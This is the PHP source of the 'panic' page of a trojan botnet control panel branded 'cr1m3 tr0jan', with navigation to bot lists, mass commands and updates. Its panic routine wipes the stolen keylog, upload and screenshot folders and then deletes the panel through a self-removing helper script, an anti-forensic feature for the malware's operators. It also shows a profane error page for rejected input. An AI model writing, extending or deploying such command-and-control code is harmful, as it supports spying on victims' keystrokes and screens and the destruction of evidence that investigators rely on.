<?php
	require_once("config.php");
	
	function __clear_all() {
		echo("Remove...");
	}

	function __security_error() {
		echo('<html><body style="text-align:center;background-color:red;color:white;"><h1 style="font-size:120px;">Who\'re you trying to fuck m0th3rfuck3r?</h1></body></html>');
		exit(0);
	}
	
	function __auto_remove() {
		$dir_list = array("js", "css", "data/keylog", "data/upload", "data/screenshot", "data" ,"img", ".");
		$i=0;
		$file_name = "";
		
		for($i=0;$i<=count($dir_list);$i++) {
			$dir_handle = opendir($dir_list[$i]);
			
			while(($file_name=readdir($dir_handle))!==false) {
				if(is_dir($file_name)==false) {
					if($dir_list[$i]==".")
						unlink($file_name);
					else
						unlink($dir_list[$i] . "/" . $file_name);
				}
			}

			if($dir_handle)
				closedir($dir_handle);			

		}

		$i=0;
		for($i=0;$i<=count($dir_list);$i++) {
			if(strcmp($dir_list[$i],"data")!=0 && substr($dir_list[$i], 0,1)!='.') {
					echo("OK<br>\n");
					if(rmdir($dir_list[$i])==false)
					if(rmdir(getcwd() . "/" . $dir_list[$i])==false)
						echo("rmdir not found<br>\n");
			}
		
		}
	
		if(file_exists("panic.php")==true) {
			$f=fopen("data/end.php", "w");
			fwrite($f,'<?php unlink("../panic.php"); unlink("end.php"); chdir("../"); rmdir("data"); ?>');
			fclose($f);
			header("Location: data/end.php");
		}

		else 
			rmdir("data");
		
	}


        function __login_status() {
                session_start();
                $ip = $_SERVER['REMOTE_ADDR'];
                $sum = md5(LOGIN_USER . LOGIN_PASS . $ip);

                if(!isset($_SESSION['token'])) {
                           return false;
                }
                else {
                        if($_SESSION['token']==$sum) {
                                return true;
                        }
                }

                return false;
        }



//main()
        if(__login_status()==false) {
                header("Location: login.php");
                return 0;
        }

	
	$option = trim($_GET['option']);


	if(!empty($option)) {
		if(is_numeric($option)==FALSE) {
			__security_error();
		}
		
		else {
			switch(intval($option)) {
				case 1:
					__clear_all();
					//__auto_remove();
					break;					
				default:
					__security_error();
					break;
			}		
		}	

	}
	
?>

<html>
<head>
        <title>cr1m3 tr0jan...</title>
        <link type="text/css" rel="stylesheet" href="css/main.css">
	<script>

                function __get_url() {
                        var pathArray = window.location.pathname.split('/');

                        url = window.location.protocol;
                        url += "//";
                        url += window.location.host;

                        for(i=0;i<=pathArray.length-2;i++) {
                                url += pathArray[i];
                                url += "/";
                        }


                        return(url);
                }


		function __panic() {
			if(!confirm("Do you like remove bot cpanel to this server??"))
				return(0);
	
			var next_url = "";
			next_url = __get_url() + "panic.php?option=1";
			window.location.href = next_url; 		
		}

	</script>
</head>
<body>

<header>
	<h1>Cr1m3</h1>
</header>
<nav>
	<ul>
		<li><a href="./main.php">Main</a></li>
		<li><a href="./list.php">Bots</a></li>
		<li><a href="./massive.php">Massive</a></li>
		<li><a href="./update.php">Update</a></li>
		<li><a href="./panic.php">Panic</a></li>
		<li><a href="./logout.php">Logout</a></li>
	</ul>
</nav>
<section>
	<article class="panic_button">
		<!-- <img height="40%" width="60%" src="img/panic_logo.png"> -->
		<input type="button" onclick="javascript:__panic();" value="PANIC">
	</article>
	

</section>

<footer>
	@cr1m3 // by h0ffy (JennyLab)
</footer>


</body>
</html>
